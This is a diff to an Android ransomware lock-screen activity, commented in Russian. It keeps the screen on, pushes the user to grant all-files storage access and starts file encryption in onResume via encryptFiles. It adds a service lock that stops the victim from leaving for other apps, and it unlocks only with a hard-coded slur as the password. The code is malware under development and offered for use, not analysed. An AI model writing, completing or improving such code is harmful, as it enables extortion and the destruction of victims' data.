@@ -28,12 +28,14 @@ public class LockActivity extends Activity {
     private Handler handler = new Handler();
     private boolean isUnlocked = false;
     private File targetDir;
-    private boolean isAnimationStarted = false;
 
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         setContentView(R.layout.activity_lock);
+
+        // Включаем блокировку для слушателя приложений
+        VolumeBlockService.setLocked(true);
 
         getWindow().addFlags(
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
@@ -83,14 +85,13 @@ public class LockActivity extends Activity {
         View mainBlock = findViewById(R.id.mainBlock);
         Button grantButton = findViewById(R.id.grantButton);
 
-        // Проверяем, вернулись ли мы из окна разрешений
         boolean isReturningFromSettings = getIntent().getBooleanExtra("RETURNING_FROM_SETTINGS", false);
         boolean isReturningFromExit = getIntent().getBooleanExtra("RETURNING_FROM_EXIT", false);
 
         if (isReturningFromExit || isReturningFromSettings) {
-            // Пропускаем анимацию
             bootText.setVisibility(View.GONE);
             mainBlock.setVisibility(View.VISIBLE);
+            
             if (mp == null) {
                 mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
                 if (mp != null) {
@@ -101,9 +102,7 @@ public class LockActivity extends Activity {
             if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
                 grantButton.setVisibility(View.VISIBLE);
             }
-            isAnimationStarted = true;
         } else {
-            // Первый запуск (анимация)
             bootText.setVisibility(View.VISIBLE);
             mainBlock.setVisibility(View.GONE);
 
@@ -137,16 +136,20 @@ public class LockActivity extends Activity {
         EditText passwordInput = findViewById(R.id.passwordInput);
         TextView enterButton = findViewById(R.id.enterButton);
 
-        // Кнопка открывает настройки
+        passwordInput.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                passwordInput.requestFocus();
+                android.view.inputmethod.InputMethodManager imm = (android.view.inputmethod.InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
+                imm.showSoftInput(passwordInput, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT);
+            }
+        });
+
         grantButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 if (Build.VERSION.SDK_INT >= 30) {
-                    // Передаем флаг, чтобы при возврате не запускалась анимация
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
-                    startActivity(intent);
-                    // Запоминаем, что мы ушли в настройки
-                    getIntent().putExtra("RETURNING_FROM_SETTINGS", true);
+                    startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
                 }
             }
         });
@@ -157,6 +160,9 @@ public class LockActivity extends Activity {
                 String password = passwordInput.getText().toString();
                 if (password.equals("pidori")) {
                     isUnlocked = true;
+                    // Отключаем блокировку вылета для других приложений
+                    VolumeBlockService.setLocked(false);
+                    
                     if (mp != null) {
                         mp.stop();
                         mp.release();
@@ -177,15 +183,6 @@ public class LockActivity extends Activity {
         });
     }
 
-    // Ловим возврат из окна настроек
-    @Override
-    protected void onNewIntent(Intent intent) {
-        super.onNewIntent(intent);
-        setIntent(intent);
-        // Тут можно принудительно пересоздать активити, если надо
-        recreate();
-    }
-
     @Override
     protected void onResume() {
         super.onResume();
@@ -199,6 +196,18 @@ public class LockActivity extends Activity {
                         encryptFiles(targetDir);
                     }
                 }).start();
+            }
+        }
+    }
+
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        setIntent(intent);
+        if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
+            Button grantButton = findViewById(R.id.grantButton);
+            if (grantButton != null) {
+                grantButton.setVisibility(View.GONE);
             }
         }
     }
@@ -274,4 +283,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-            }
+                        }
